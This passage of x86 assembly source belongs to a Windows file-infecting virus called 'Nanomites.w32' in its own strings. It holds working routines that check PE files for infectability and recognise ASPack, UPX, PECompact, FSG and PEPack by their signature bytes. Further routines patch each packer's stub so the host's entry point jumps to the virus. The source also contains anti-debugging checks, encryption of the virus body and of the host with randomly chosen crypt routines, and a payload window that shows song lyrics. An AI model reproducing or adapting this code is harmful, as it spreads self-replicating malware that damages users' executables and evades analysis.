       xor cx, 'de'                              ;
       cmp cx, 'EP' xor 'de'                     ;
       nanojmp jmp_jne, error_pe                 ;
       clc                                       ;
       nanojmp jmp_jmp, pe_ok                    ;
error_pe:                                        ;
       stc                                       ;
pe_ok:                                           ;
       popad                                     ;
       ret                                       ;
CheckPE endp                                     ;
                                                 ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;CheckCriterium... checks if this file fullfills our needes
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
CheckCriterium proc                              ;
       pushad                                    ;
       mov ebx, [ebp+memptr]                     ;
       add ebx, dword ptr[ebx+3Ch]               ;
       lea eax, [ebx+0F8h]                       ;
       movzx ecx, [ebx.NT_FileHeader.FH_NumberOfSections] ;
       mov esi, [ebx.NT_OptionalHeader.OH_AddressOfEntryPoint] ;
                                                 ;
       mov edi, [eax.SH_VirtualAddress]          ; Due to FSG 2.0 where EP is
       cmp esi, edi                              ; in PE header we will use
       nanojmp jmp_jnb, find_ep_section          ; EP as RVA and RAW ptr...
       mov [ebp+entry_rva], esi                  ;
       mov [ebp+entry_raw], esi                  ;
       mov [ebp+nthdr], ebx                      ;
       nanojmp jmp_jmp, rec_packer               ;
                                                 ; 
find_ep_section:                                 ; 
       mov edi, [eax.SH_VirtualAddress]          ;
       cmp esi, edi                              ;
       nanojmp jmp_jb, next_section              ;
       add edi, [eax.SH_VirtualSize]             ;
       cmp esi, edi                              ;
       nanojmp jmp_jb, got_ep_section            ;
next_section:                                    ;
       add eax, size IMAGE_SECTION_HEADER        ;
       dec ecx                                   ;
       nanojmp jmp_jnz, find_ep_section          ;
                                                 ;
got_ep_section:                                  ;
       mov [ebp+sectionEP], eax                  ; save EP section ptr
       mov [ebp+nthdr], ebx                      ; save PTR to NT_HEADERS
       mov [ebp+entry_rva], esi                  ; save RVA of entrypoint
       sub esi, [eax.SH_VirtualAddress]          ;
       add esi, [eax.SH_PointerToRawData]        ;
       mov [ebp+entry_raw], esi                  ; save RAW of entrypoint
                                                 ;
rec_packer:                                      ;
       add esi, [ebp+memptr]                     ;
       call RecognizePacker                      ; at first place I've used 
       nanojmp jmp_jc, not_packed                ; EPsec != BaseOfCode to compare this
       mov [ebp+packed], 1                       ; but since there is not good criterium I
       nanojmp jmp_jmp, continue_analayzing      ; just run comparation via this proc
not_packed:                                      ;
       mov [ebp+packed], 0                       ; other packers are infected as normal file
       mov esi, [eax.SH_VirtualAddress]          ; is BaseOfCode = EP_sec.VirtualAddress ???
       cmp esi, [ebx.NT_OptionalHeader.OH_BaseOfCode] ;
       jne error_ct                              ; if not equ set Carry and exit (file is not infectable)
continue_analayzing:                             ; 
       clc                                       ;
       nanojmp jmp_jmp, exit_ct                  ;
error_ct:                                        ;
       stc                                       ;
exit_ct:                                         ;
       popad                                     ;
       ret                                       ;
CheckCriterium endp                              ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; Close open file
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
CloseFile proc                                   ;
       push [ebp+memptr]                         ;
       calle UnmapViewOfFile                     ;
       push [ebp+temp]                           ;
       calle CloseHandle                         ;
       push [ebp+fd]                             ;
       calle CloseHandle                         ;
       ret                                       ;
CloseFile endp                                   ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; Recognize packer will try to recognize given packker if any
;    currently can handle ASpack 2.12 and UPX 8.xx - 1.25
;    in - esi (raw_EIP + mapped file)
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
RecognizePacker proc                             ;
       pushad                                    ;
       mov ecx, dword ptr[ebp+Packer_ID]         ; get num of packers
loop_packers:                                    ; 
       dec  ecx                                  ; 
       push esi                                  ; save raw EP
       mov edi, dword ptr [ebp + ecx * 8 + Packer_ID + 4 + 4] ; get matching string
       add esi, dword ptr [ebp + ecx * 8 + Packer_ID + 4]     ; add esi offset to match
       add edi, ebp                              ; adjust string address in virus
       push ecx                                  ; save counter
       mov ecx, 13                               ; 
       repe cmpsb                                ; and compare EP with our string
       pop ecx                                   ; restore counter
       pop esi                                   ; restore EP_raw
       nanojmp jmp_jz, fill_FooBar               ; do we have mathing packer?
       test ecx, ecx                             ; did we finish?
       nanojmp jmp_jnz, loop_packers             ;
       call CheckPePack                          ; PePack has no good sig bytes
       nanojmp jmp_jnc, exit_packer              ; at EP so other tehnique has to
                                                 ; be used
       stc                                       ; NO packer, set carry
       nanojmp jmp_jmp, exit_packer              ; and exit
                                                 ;
fill_FooBar:                                     ;
       lea esi, [ebp+PackerProcs]                ; array of packer procs
       mov esi, dword ptr[esi+ecx*4]             ; and get proc for current packer
       add esi, ebp                              ; ajust address of prock in viri
       mov [ebp+FooBarPacker], esi               ; and fill FooBarPacker with it
       clc                                       ; cool, clear CF 
exit_packer:                                     ;
       popad                                     ;
       ret                                       ;
RecognizePacker endp                             ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; CheckPePack - PEPack is located in last section... so here we go with it
; it also fills FooBarPacker...
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
CheckPePack proc                                 ;
       pushad                                    ;
       mov ebx, [ebp+nthdr]                      ;
       movzx ecx, [ebx.NT_FileHeader.FH_NumberOfSections] ;
       dec ecx                                   ;
       imul ecx, ecx, size IMAGE_SECTION_HEADER  ;
       lea eax, [ebx+ecx+0F8h]                   ; go to last section
       mov esi, [eax.SH_PointerToRawData]        ;
       add esi, [ebp+memptr]                     ;
       mov edi, offset pepack                    ; sig bytes in EDI
       add edi, ebp                              ; and align it
       mov ecx, 13                               ;
       repe cmpsb                                ;
       nanojmp jmp_jz, fill_pepack_foo           ;
       stc                                       ;
       nanojmp jmp_jmp exit_CPEP                 ;
                                                 ;
fill_pepack_foo:                                 ;
       mov edi, offset PEPack                    ;
       add edi, ebp                              ;
       mov [ebp+FooBarPacker], edi               ;
       clc                                       ;
                                                 ;
exit_CPEP:                                       ;
       popad                                     ;
       ret                                       ;
CheckPePack endp                                 ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; ASPack procedure deals with inline patching of ASpack =)
; esi = raw_EP
; edi = rva of virus
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ASPack proc                                      ;       
       pushad                                    ;
       add esi, [ebp+memptr]                     ;
       add esi, 39Ah                             ; here will be stored
       push dword ptr[esi]                       ; mov eax, EP_RVA and we
       pop dword ptr[ebp+OldEntryPoint]          ; patch it to the RVA of 
       mov dword ptr[esi], edi                   ; viri
       popad                                     ;
       ret                                       ;
ASPack endp                                      ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;UPX procedure this is little more confusing than ASpack but it works
;    pretty good...
;    same as above esi = raw_EP, edi = rva of virus
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
UPX proc                                         ;
       pushad                                    ;
       add esi, [ebp+memptr]                     ;
loop_UPX:                                        ; UPX has at the end jmp OEP
       push esi                                  ; but it is not at a constant
       call ldex86                               ; offset (depends on version)
       add esi, eax                              ; so I will just search for
       cmp byte ptr[esi], 61h                    ; popad and jmp OEP followed
       nanojmp jmp_jne, loop_UPX                 ; by it... prety cool 
       inc esi                                   ; go to jmp _OEP
       push esi                                  ; save addr of jmp _OEP
                                                 ;
       inc esi                                   ; and go to relative 32
       mov ebx, [ebp+nthdr]                      ; here comes calculation
       mov ecx, [ebp+sectionEP]                  ; of place where we are
       mov edx, dword ptr[esi]                   ; to the OEP so we can get
       sub esi, [ecx.SH_PointerToRawData]        ; RVA ov OEP
       add esi, [ecx.SH_VirtualAddress]          ;
       dec esi                                   ;
       sub esi, [ebp+memptr]                     ;
       add esi, edx                              ;
       add esi, 5                                ;
       mov [ebp+OldEntryPoint], esi              ; save RVA of OEP
       pop esi                                   ; and pop ESI
                                                 ;
       xchg esi, edi                             ; RVA in ESI
       dec edi                                   ; go to popad
       mov al, 68h                               ; gen:
       stosb                                     ;     push virus_va
       mov eax, esi                              ;     ret 
       add eax, [ebx.NT_OptionalHeader.OH_ImageBase] ;
       stosd                                     ;
       mov al, 0C3h                              ;
       stosb                                     ;
       popad                                     ;
       ret                                       ;
UPX endp                                         ;
include ldex86bin.inc                            ; ldex86 length decoder
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;PECompact ... little specific... OEP is easily found... b/c packer 
;     starts from OEP... and goes to last section...
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
PECompact proc                                   ;
       pushad                                    ;
       mov eax, [ebp+sectionEP]                  ;
       mov edx, esi                              ;
       sub edx, [eax.SH_PointerToRawData]        ;
       add edx, [eax.SH_VirtualAddress]          ;
       mov [ebp+OldEntryPoint], edx              ;
       add esi, [ebp+memptr]                     ;
       mov eax, [esi+1]                          ; get address of SEH handle
       sub esi, [ebp+memptr]                     ; 
       mov ebx, [ebp+nthdr]                      ; 
       sub eax, [ebx.NT_OptionalHeader.OH_ImageBase] ; get RVA of SEH (PE compact start)
       lea edx, [ebx+0F8h]                       ; get sections ptr
       movzx ecx, [ebx.NT_FileHeader.FH_NumberOfSections] ; get number of sections
       push edi                                  ; save entrypoint RVA
loop_PC_sec:                                     ;
       mov edi, [edx.SH_VirtualAddress]          ;
       cmp eax, edi                              ;
       nanojmp jmp_jb, next_PC_section           ;
       add edi, [edx.SH_VirtualSize]             ;
       cmp eax, edi                              ;
       nanojmp jmp_jb, got_PC_section            ;
next_PC_section:                                 ;
       add edx, size IMAGE_SECTION_HEADER        ;
       dec ecx                                   ;
       test ecx, ecx                             ;
       nanojmp jmp_jnz, loop_PC_sec              ;
                                                 ;
got_PC_section:                                  ;
       sub eax, [edx.SH_VirtualAddress]          ;
       add eax, [edx.SH_PointerToRawData]        ;
       add eax, [ebp+memptr]                     ;
       add eax, 0C7h                             ; go to patch place
       mov edi, eax                              ;      
       mov al, 0B8h                              ;
       stosb                                     ;
       pop eax                                   ; get saved virus RVA
       add eax, [ebx.NT_OptionalHeader.OH_ImageBase] ;
       stosd                                     ;
       mov ax, 0E0FFh                            ;
       stosw                                     ;
       popad                                     ;
       ret                                       ;
PECompact endp                                   ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; FSG, deals with patching of FSG...
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
FSG proc                                         ;
       pushad                                    ;
       push edi                                  ;
       add esi, [ebp+memptr]                     ;
       mov eax, dword ptr[esi+2]                 ; get address of needed stuff
       mov ebx, [ebp+nthdr]                      ;
       sub eax, [ebx.NT_OptionalHeader.OH_ImageBase]; eax + 10h is VA of OEP
       movzx ecx, [ebx.NT_FileHeader.FH_NumberOfSections] ;
       lea edx, [ebx+0F8h]                       ;
                                                 ;
loop_fsg:                                        ;
       mov edi, [edx.SH_VirtualAddress]          ; find section where this
       cmp eax, edi                              ; is located at...
       nanojmp jmp_jb, next_fsg                  ;
       add edi, [edx.SH_VirtualSize]             ;
       cmp eax, edi                              ;
       nanojmp jmp_jb, got_fsg                   ;
next_fsg:                                        ;
       add edx, size IMAGE_SECTION_HEADER        ;
       loop loop_fsg                             ;
                                                 ;
got_fsg:                                         ;
       sub eax, [edx.SH_VirtualAddress]          ;
       add eax, [edx.SH_PointerToRawData]        ;
       add eax, [ebp+memptr]                     ;
       mov ecx, dword ptr[eax+10h]               ; and in ECX VA OEP
       pop edi                                   ; get saved RVA of viri
       add edi, [ebx.NT_OptionalHeader.OH_ImageBase]
       mov dword ptr[eax+10h], edi               ; and save VA ov virus
       sub ecx, [ebx.NT_OptionalHeader.OH_ImageBase];
       mov [ebp+OldEntryPoint], ecx              ; save RVA of OEP
       popad                                     ;
       ret                                       ;
FSG endp                                         ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;PEPack... deals with inline patching of PEpack
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
PEPack proc                                      ;
       pushad                                    ;
       mov ebx, [ebp+nthdr]                      ;
       movzx ecx, [ebx.NT_FileHeader.FH_NumberOfSections] ;
       dec ecx                                   ;
       imul ecx, ecx, size IMAGE_SECTION_HEADER  ;
       lea eax, [ebx+ecx+0F8h]                   ; go to last section
       mov esi, [eax.SH_PointerToRawData]        ;
       add esi, [ebp+memptr]                     ;
       add esi, 557h                             ; here is RVA of OEP
       push dword ptr[esi]                       ; save old RVA
       pop [ebp+OldEntryPoint]                   ;
       mov [esi], edi                            ; and put new one
       popad                                     ;
       ret                                       ;
PEPack endp                                      ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; packer signature bytes + other data needed to recognize packer
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Packer_ID:                                       ;
       dd     4                                  ; how many packers?
       dd     0                                  ; offset from EP
       dd     offset  aspack                     ; offset of ASPack sig bytes
       dd     0Ch                                ; EP + 12 for UPX
       dd     offset  upx                        ; offset of UPX sig bytes
       dd     5                                  ; EP + 5  for PECompact
       dd     offset pecompact                   ; offset of PECompact sig bytes
       dd     6                                  ; EP+6
       dd     offset fsg                         ; FSG 2.0 sig bytes                                        
                                                 ;                                    
aspack:                                          ; ASpack signature
       db     060h, 0E8h, 003h, 000h, 000h, 000h ; bytes
       db     0E9h, 0EBh, 004h, 05Dh, 045h, 055h ;
       db     0C3h                               ;
                                                 ;
upx:                                             ; UPX signature
       db     057h, 083h, 0CDh, 0FFh, 0EBh, 010h ; bytes
       db     090h, 090h, 090h, 090h, 090h, 090h ;
       db     08Ah, 006h, 046h, 088h, 007h       ;
                                                 ;
pecompact:                                       ; PeCompact signature
       db     050h, 064h, 0FFh, 035h, 000h, 000h ; bytes
       db     000h, 000h, 064h, 089h, 025h, 000h ;
       db     000h, 000h, 000h, 033h, 0C0h, 089h ;
       db     008h                               ;
                                                 ;
fsg:                                             ;
       db     061h, 094h, 055h, 0A4h, 0B6h, 080h ; FSG 2.0 sig bytes
       db     0FFh, 013h, 073h, 0F9h, 033h, 0C9h ;
       db     0FFh, 013h, 073h, 016h             ; 
                                                 ;
pepack:                                          ;
       db     060h, 0E8h, 000h, 000h, 000h, 000h ; used separately for PEPack
       db     05Dh, 083h, 0EDh, 006h, 080h, 0BDh ; in check PEPack
       db     03Eh, 005h, 000h, 000h, 001h       ; 
PackerProcs:                                     ; addresses of coresponding
       dd     offset ASPack                      ; procedures for recognized
       dd     offset UPX                         ; packers, FooBarPacker is
       dd     offset PECompact                   ; filled with this addresses
       dd     offset FSG                         ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;Payload............
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
payload proc                                     ;
       pushad                                    ;
       push PAGE_READWRITE                       ;
       push MEM_COMMIT                           ;
       push 1000h                                ;
       push 0                                    ;
       calle VirtualAlloc                        ;
       test eax, eax                             ;
       jz exit_payload                           ;
       mov [ebp+viritext], eax                   ;
       lea esi, [ebp+ViriText]                   ;
       mov edi, eax                              ;
       mov ecx, msgsize                          ;
                                                 ;
denotestring:                                    ;
       lodsb                                     ;
       not al                                    ;
       stosb                                     ;
       loop denotestring                         ;
                                                 ;
       pushs <"user32">                          ;
       calle LoadLibraryA                        ;
       lea esi, [ebp+user32apis]                 ;
       lea edi, [ebp+LoadIconA]                  ;
       mov ecx, user32apisnum                    ;
       mov ebx, eax                              ;
       call LoadApis                             ; LoadApis for 
                                                 ; init WNDCLASSEX
       push eax                                  ;
       calle GetModuleHandleA                    ;
       mov [ebp+wc.hInstance], eax               ;
       mov [ebp+hInst], eax                      ;
       mov [ebp+wc.cbSize],size WNDCLASSEX       ; fill values in members of wc
       mov [ebp+wc.style], CS_HREDRAW or CS_VREDRAW ;
       lea eax, [ebp+WndProc]                    ;
       mov [ebp+wc.lpfnWndProc], eax             ;
       mov [ebp+wc.cbClsExtra],0                 ;
       mov [ebp+wc.cbWndExtra],0                 ;
       mov [ebp+wc.hbrBackground],COLOR_WINDOW+1 ;
       mov [ebp+wc.lpszMenuName],0               ;
       lea eax, [ebp+ClassName]                  ;
       mov [ebp+wc.lpszClassName],eax            ;
                                                 ;
       push IDI_APPLICATION                      ;
       push 0                                    ;
       calle LoadIconA                           ;
       mov [ebp+wc.hIcon],eax                    ;
       mov [ebp+wc.hIconSm],eax                  ;
       push IDC_ARROW                            ;
       push 0                                    ;
       calle LoadCursorA                         ;
       mov [ebp+wc.hCursor],eax                  ;
       lea eax, [ebp+wc]                         ;
       call [ebp+RegisterClassExA], eax          ;
       lea eax, [ebp+ClassName]                  ;
       lea ebx, [ebp+VirusName]                  ;
       call [ebp+CreateWindowExA], 0, eax, ebx, \;             
                     WS_OVERLAPPEDWINDOW, \      ;
                     CW_USEDEFAULT,\             ;
                     CW_USEDEFAULT,\             ;
                     200h,\ ;CW_USEDEFAULT,\     ;
                     280h,\;CW_USEDEFAULT,\      ;
                     0, 0, [ebp+hInst], 0        ;
       mov [ebp+hWnd], eax                       ;
       test eax, eax                             ;
       jz exit_free                              ;
                                                 ;
       push SW_SHOWNORMAL                        ;
       push [ebp+hWnd]                           ;
       calle ShowWindow                          ;
       push [ebp+hWnd]                           ;
       calle UpdateWindow                        ;
                                                 ;
process_message:                                 ;
       xor ebx, ebx                              ;
       push ebx                                  ;
       push ebx                                  ;
       push ebx                                  ;
       lea ebx, [ebp+msg]                        ;
       push ebx                                  ;
       calle GetMessageA                         ;
       test eax, eax                             ;
       jz exit_free                              ;
                                                 ;
       lea ebx, [ebp+msg]                        ;
       push ebx                                  ;
       calle TranslateMessage                    ;
       lea ebx, [ebp+msg]                        ;
       push ebx                                  ;
       calle DispatchMessageA                    ;
       jmp process_message                       ;
                                                 ;
exit_free:                                       ;
       push MEM_DECOMMIT                         ;
       push 1000h                                ;
       push [ebp+viritext]                       ;
       calle VirtualFree                         ;
                                                 ;
exit_payload:                                    ;
       popad                                     ;
       ret                                       ;
payload endp                                     ;
ClassName     db     "vIrUsClAsS",0              ;
VirusName     db     "Nanomites.w32",0           ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;WndProc - processing Messages for window
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
WndProc proc hWnd1:dword, uMsg:dword, wParam:dword, lParam:dword ;
       LOCAL hdc1:DWORD                          ;
       pushad                                    ;
       call deltaWndProc                         ;
deltaWndProc:                                    ;
       pop ebx                                   ;
       sub ebx, offset deltaWndProc              ;
                                                 ;
       cmp uMsg, WM_DESTROY                      ;
       je wmclose                                ;
       cmp uMsg, WM_PAINT                        ;
       je wmpaint                                ;
                                                 ;
       push lParam                               ;
       push wParam                               ;
       push uMsg                                 ;
       push hWnd1                                ;
       call [ebx+DefWindowProcA]                 ; call default Window proc 
       jmp exit_def                              ;                                          
                                                 ;
wmpaint:                                         ;
       lea eax, [ebx+ps]                         ;
       call [ebx+BeginPaint],hWnd1, eax          ;
       mov  hdc1, eax                            ;
       lea eax, [ebx+rect]                       ;
       call [ebx+GetClientRect],hWnd1, eax       ;
       lea eax, [ebx+rect]                       ;
       mov edx, [ebx+viritext]                   ;
       call [ebx+DrawTextA], hdc1, edx, -1, \    ;
                            eax , DT_CENTER      ; 
       lea edx, [ebx+ps]                         ;
       call [ebx+EndPaint],hWnd1, edx            ;
       jmp exit_wnd                              ;
wmclose:                                         ;
       push 0                                    ;
       call [ebx+PostQuitMessage]                ;
                                                 ;
exit_wnd:                                        ;       
       xor eax, eax                              ;
exit_def:                                        ;
       mov [esp.Pushad_eax], eax                 ;
       popad                                     ;
       ret                                       ;
WndProc endp                                     ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; She is my sin - Nightwish
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ViriText:                                                                    ;
       nots   <Once upon a time... God made us all equal>                    ; 
       nots   <Once upon a time... we fought for freedom>                    ;
       nots   <Well, probably, as you know, some are more equal then others> ; Animal Farm =)
       nots   <==========================================>                   ;
       nots   <      She Is My Sin>                                          ;
       nots   <==========================================>                   ;
       nots   <Take heed, dear heart>                                        ;
       nots   <Once apart, she can touch nor me nor you>                     ;
       nots   <Dressed as one, A wolf will betray a lamb>                    ;
       nots   <Lead astray the gazers>                                       ;
       nots   <The razors on your seducing skin>                             ;
       nots   <In the meadow of sinful thoughts>                             ;
       nots   <Every flower is a perfect one>                                ;
       nots   <>                                                             ;
       nots   <To paradise with pleasure haunted, haunted by fear>           ;
       nots   <A sin for him, Desire within, Desire within>                  ;
       nots   <A burning veil, For the bride too dear for him>               ;
       nots   <A sin for him, Desire within, Desire within>                  ;
       nots   <Fall in love with your deep dark sin>                         ;
       nots   <>                                                             ;
       nots   <I am the Fallen, You are what my sins enclose>                ;
       nots   <Lust is not as creative, As its discovery>                    ;
       nots   <To paradise with pleasure haunted, haunted by fear>           ;
       nots   <A sin for him, Desire within, Desire within>                  ;
       nots   <A burning veil, For the bride too dear for him>               ;
       nots   <A sin for him, Desire within, Desire within>                  ;
       nots   <Fall in love with your deep dark sin>                         ;
       nots   <>                                                             ;
       nots   <Bless me, undress me>                                         ;
       nots   <Pick your prey in a wicked way>                               ;
       nots   <God I must confess, I do envy the sinners>                    ;
       nots   <A sin for him, Desire within, A burning veil>                 ;
       nots   <For the bride too dear for him>                               ;
       nots   <A sin for him, Desire within, Desire within>                  ;
       nots   <A burning veil, For the bride too dear for him>               ;
       nots   <A sin for him, Desire within, Desire within>                  ;
       nots   <Fall in love with your deep dark sin...>                      ;
       notsend                                                               ;
       msgsize = $-ViriText                                                  ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;Automated process of loading APIs
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
LoadApis proc                                    ; 
cycle_apis:                                      ;
       lodsd                                     ;
       push eax                                  ;
       push ebx                                  ;
       call getprocaddress                       ;
       stosd                                     ;
       dec ecx                                   ;
       nanojmp jmp_jnz, cycle_apis               ;
       xor eax, eax                              ;
       ret                                       ;
LoadApis endp                                    ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; IsDebugPresent ... does same as IsDebuggerPresent
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
IsDebugPresent proc                              ;
       mov eax, dword ptr FS:[30h]               ;
       movzx eax, byte ptr[eax+2]                ;
       ret                                       ;
IsDebugPresent endp                              ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; GiveMeCheckSum is used to check if there is some BP set inside of our 
; code in next generations ... it is actually z0mbie's hash algo...
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
GiveMeCheckSum proc                              ;
       lea esi, [ebp+EncryptedArea]              ;
       xor eax, eax                              ;
       mov ecx, check_this - EncryptedArea       ;
                                                 ;
calc_checksum:                                   ;
       rol eax, 7                                ;
       xor al, byte ptr[esi]                     ;
       inc esi                                   ;
       dec ecx                                   ;
       jnz calc_checksum                         ;
       ret                                       ;
GiveMeCheckSum endp                              ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; CheckKernel32Apis is used to check if BPX is set on these APIs
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
CheckKernel32Apis proc                           ;
       lea esi, [ebp+GetModuleHandleA]           ;
       mov ecx, kernel32apisnum                  ;
                                                 ;
check_int3h:                                     ;
       dec ecx                                   ;
       mov eax, [esi+ecx*4]                      ; EAX = address of API
       cmp byte ptr[eax], 0CCh                   ; and check if there is int 3h
       je error_CK32                             ;
       test ecx, ecx                             ;
       jnz check_int3h                           ;
       clc                                       ;
       jmp exit_CK32                             ;
error_CK32:                                      ;
       stc                                       ;
exit_CK32:                                       ;
       ret                                       ;
CheckKernel32Apis endp                           ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;procs for random number...
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
InitSeed proc                                    ; Needed proc for 
       pushad                                    ; random number in range
       lea edi, [ebp+random_seed]                ; generating...
       call __randomize                          ;
       popad                                     ;
       ret                                       ;
InitSeed endp                                    ;
brandom32 proc                                   ;
       pushad                                    ;
       mov edx, eax                              ;
       lea eax, [ebp+random_seed]                ;
       call __random                             ;
       mov [esp.Pushad_eax], eax                 ;
       popad                                     ;
       ret                                       ;
brandom32 endp                                   ;
include pkrng.inc                                ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; EncryptViri ... proc to encrypt viri...
;             esi = start of viri
;             ecx = virisize/4
;             [ebp+ViriKey] - crypt key
;             [ebp+ViriKeyInc] - Increment for ViriKey
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
EncryptViri proc                                 ;
       pushad                                    ;
       mov ebx, [ebp+ViriKey]                    ;
       mov edx, [ebp+ViriKeyInc]                 ;
                                                 ;
crypt_viri:                                      ;
       sub [esi], ebx                            ;
       xor [esi], ebx                            ;
       add esi, 4                                ;
       add ebx, edx                              ;
       loop crypt_viri                           ; 
       popad                                     ; 
       ret                                       ;
EncryptViri endp                                 ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; Crypt HOST and set DecryptHost for next generations
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
CryptHost proc                                   ;
       pushad                                    ;
       lea esi, [ebp+crypters]                   ;
       lodsd                                     ; how many?
       call brandom32                            ; get random number
       mov ebx, [esi+eax*4]                      ; and get offset of crypt
       mov [ebp+CryptHostAgain], ebx             ; for next generations...
       add ebx, ebp                              ; adjust it with delta
       call ebx                                  ; call crypt routine
       lea esi, [ebp+decryptors]                 ; 
       mov ebx, [esi+eax*4]                      ; get offset of decrypt
       mov [ebp+DecryptHost], ebx                ; and store decryption routine
       popad                                     ; for next generations 
       ret                                       ;
CryptHost endp                                   ;      
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;Table of crypt/decrypt offsets...
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
crypters:                                        ;
       dd     3                                  ;
       dd     offset crypt1                      ;
       dd     offset crypt2                      ;
       dd     offset crypt3                      ;
                                                 ;
decryptors:                                      ;
       dd     offset decrypt1                    ;
       dd     offset decrypt2                    ;
       dd     offset decrypt3                    ;
